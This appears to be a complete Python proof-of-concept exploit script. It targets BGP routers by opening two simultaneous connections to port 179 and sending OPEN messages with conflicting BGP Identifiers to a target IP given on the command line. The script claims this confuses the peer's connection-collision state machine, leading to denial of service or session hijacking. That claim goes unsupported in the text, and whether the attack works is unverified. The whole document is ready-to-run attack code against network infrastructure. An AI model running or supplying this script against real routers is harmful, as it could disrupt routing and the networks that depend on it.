#!/usr/bin/env python3
"""
Proof-of-Concept: BGP OPEN Message Collision State Confusion

This script demonstrates a vulnerability in BGP implementations where simultaneous
TCP connections with manipulated BGP Identifiers can cause the peer's Finite State
Machine (FSM) to enter an inconsistent state, potentially leading to a Denial of
Service (DoS) or session hijacking.

Reference: RFC 4271, Sections 6.8 (Connection Collision Detection) and 8.2.2 (FSM)

Usage:
    python3 poc_bgp_open_collision_state_confusion.py <TARGET_IP>
"""

import socket
import struct
import sys
import time
import threading

# BGP Constants
BGP_PORT = 179
BGP_VERSION = 4
BGP_MARKER_SIZE = 16
BGP_HEADER_SIZE = 19
BGP_OPEN_MSG_TYPE = 1
BGP_KEEPALIVE_MSG_TYPE = 4
BGP_NOTIFICATION_MSG_TYPE = 3

# Helper function to create a BGP Marker (16 bytes of 0xFF)
def create_bgp_marker():
    return b'\xff' * BGP_MARKER_SIZE

# Helper function to create a BGP Header
def create_bgp_header(msg_type, msg_length):
    marker = create_bgp_marker()
    length = BGP_HEADER_SIZE + msg_length
    version = BGP_VERSION
    header = struct.pack('!HBB', length, version, msg_type)
    return marker + header

# Helper function to create a BGP OPEN message
def create_bgp_open_message(my_as, bgp_identifier, hold_time=90, optional_params=b''):
    """
    Constructs a BGP OPEN message.
    
    Args:
        my_as (int): Local Autonomous System number.
        bgp_identifier (str): BGP Identifier in dotted-quad notation (e.g., '1.2.3.4').
        hold_time (int): Hold time in seconds.
        optional_params (bytes): Optional parameters.
    
    Returns:
        bytes: The complete BGP OPEN message including header.
    """
    # Convert BGP Identifier to 4 bytes
    bgp_id_bytes = socket.inet_aton(bgp_identifier)
    
    # Pack OPEN message body
    # Version (1B), My AS (2B), Hold Time (2B), BGP Identifier (4B), Opt Parm Len (1B), Opt Parm (Var)
    open_body = struct.pack('!BHH4sB', 
                            BGP_VERSION, 
                            my_as, 
                            hold_time, 
                            bgp_id_bytes, 
                            len(optional_params)) + optional_params
    
    # Create header
    header = create_bgp_header(BGP_OPEN_MSG_TYPE, len(open_body))
    
    return header + open_body

# Helper function to create a BGP KEEPALIVE message
def create_bgp_keepalive_message():
    """
    Constructs a BGP KEEPALIVE message.
    
    Returns:
        bytes: The complete BGP KEEPALIVE message including header.
    """
    return create_bgp_header(BGP_KEEPALIVE_MSG_TYPE, 0)

# Helper function to read a BGP message
def read_bgp_message(sock):
    """
    Reads a BGP message from the socket.
    
    Args:
        sock (socket.socket): The connected socket.
    
    Returns:
        bytes: The complete BGP message, or None if connection closed.
    """
    try:
        # Read header (19 bytes)
        header_data = b''
        while len(header_data) < BGP_HEADER_SIZE:
            chunk = sock.recv(BGP_HEADER_SIZE - len(header_data))
            if not chunk:
                return None
            header_data += chunk
        
        # Parse header
        length, version, msg_type = struct.unpack('!HBB', header_data[BGP_MARKER_SIZE:])
        
        # Read message body
        body_data = b''
        body_length = length - BGP_HEADER_SIZE
        while len(body_data) < body_length:
            chunk = sock.recv(body_length - len(body_data))
            if not chunk:
                return None
            body_data += chunk
        
        return header_data + body_data
    except Exception as e:
        print(f"[!] Error reading BGP message: {e}")
        return None

# Thread function to handle the first BGP connection
def handle_first_connection(target_ip, my_as, bgp_id_1, hold_time):
    """
    Establishes the first BGP connection and sends an OPEN message.
    
    Args:
        target_ip (str): Target IP address.
        my_as (int): Local Autonomous System number.
        bgp_id_1 (str): BGP Identifier for the first connection.
        hold_time (int): Hold time in seconds.
    """
    print(f"[*] Establishing first TCP connection to {target_ip}:{BGP_PORT}...")
    sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock1.settimeout(10)
    
    try:
        sock1.connect((target_ip, BGP_PORT))
        print(f"[+] First TCP connection established.")
        
        # Send OPEN message
        open_msg_1 = create_bgp_open_message(my_as, bgp_id_1, hold_time)
        sock1.sendall(open_msg_1)
        print(f"[+] Sent OPEN message with BGP Identifier: {bgp_id_1}")
        
        # Wait for response (KEEPALIVE or NOTIFICATION)
        print("[*] Waiting for response on first connection...")
        response = read_bgp_message(sock1)
        
        if response:
            msg_type = response[BGP_MARKER_SIZE + 2]
            if msg_type == BGP_KEEPALIVE_MSG_TYPE:
                print("[+] Received KEEPALIVE on first connection. State: OpenConfirm -> Established.")
            elif msg_type == BGP_NOTIFICATION_MSG_TYPE:
                print("[!] Received NOTIFICATION on first connection. Connection closed.")
            else:
                print(f"[?] Received unexpected message type: {msg_type}")
        else:
            print("[!] No response received on first connection. Connection may have been closed.")
        
        # Keep the connection open for a while to observe state
        time.sleep(5)
        
    except socket.timeout:
        print("[!] Timeout on first connection.")
    except Exception as e:
        print(f"[!] Error on first connection: {e}")
    finally:
        sock1.close()
        print("[*] First connection closed.")

# Thread function to handle the second BGP connection
def handle_second_connection(target_ip, my_as, bgp_id_2, hold_time, delay):
    """
    Establishes the second BGP connection after a delay and sends an OPEN message.
    
    Args:
        target_ip (str): Target IP address.
        my_as (int): Local Autonomous System number.
        bgp_id_2 (str): BGP Identifier for the second connection.
        hold_time (int): Hold time in seconds.
        delay (float): Delay in seconds before establishing the connection.
    """
    time.sleep(delay)
    print(f"[*] Establishing second TCP connection to {target_ip}:{BGP_PORT}...")
    sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock2.settimeout(10)
    
    try:
        sock2.connect((target_ip, BGP_PORT))
        print(f"[+] Second TCP connection established.")
        
        # Send OPEN message with a different BGP Identifier
        open_msg_2 = create_bgp_open_message(my_as, bgp_id_2, hold_time)
        sock2.sendall(open_msg_2)
        print(f"[+] Sent OPEN message with BGP Identifier: {bgp_id_2}")
        
        # Wait for response
        print("[*] Waiting for response on second connection...")
        response = read_bgp_message(sock2)
        
        if response:
            msg_type = response[BGP_MARKER_SIZE + 2]
            if msg_type == BGP_KEEPALIVE_MSG_TYPE:
                print("[+] Received KEEPALIVE on second connection. State: OpenConfirm -> Established.")
            elif msg_type == BGP_NOTIFICATION_MSG_TYPE:
                print("[!] Received NOTIFICATION on second connection. Connection closed.")
            else:
                print(f"[?] Received unexpected message type: {msg_type}")
        else:
            print("[!] No response received on second connection. Connection may have been closed.")
        
        # Keep the connection open for a while to observe state
        time.sleep(5)
        
    except socket.timeout:
        print("[!] Timeout on second connection.")
    except Exception as e:
        print(f"[!] Error on second connection: {e}")
    finally:
        sock2.close()
        print("[*] Second connection closed.")

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <TARGET_IP>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    my_as = 65000
    bgp_id_1 = "1.1.1.1"
    bgp_id_2 = "2.2.2.2"
    hold_time = 90
    delay = 0.5  # Delay in seconds before establishing the second connection
    
    print(f"[*] Starting BGP OPEN Message Collision State Confusion PoC")
    print(f"[*] Target IP: {target_ip}")
    print(f"[*] My AS: {my_as}")
    print(f"[*] BGP Identifier 1: {bgp_id_1}")
    print(f"[*] BGP Identifier 2: {bgp_id_2}")
    print(f"[*] Hold Time: {hold_time}")
    print(f"[*] Delay before second connection: {delay}s")
    print("[*] This PoC attempts to trigger a collision state confusion by sending")
    print("[*] two OPEN messages with different BGP Identifiers on simultaneous connections.")
    print("[*] Observe the target's behavior for inconsistent FSM states or DoS.")
    print("[*] " + "="*50)
    
    # Start threads for both connections
    thread1 = threading.Thread(target=handle_first_connection, args=(target_ip, my_as, bgp_id_1, hold_time))
    thread2 = threading.Thread(target=handle_second_connection, args=(target_ip, my_as, bgp_id_2, hold_time, delay))
    
    thread1.start()
    thread2.start()
    
    thread1.join()
    thread2.join()
    
    print("[*] PoC execution completed.")

if __name__ == "__main__":
    main()
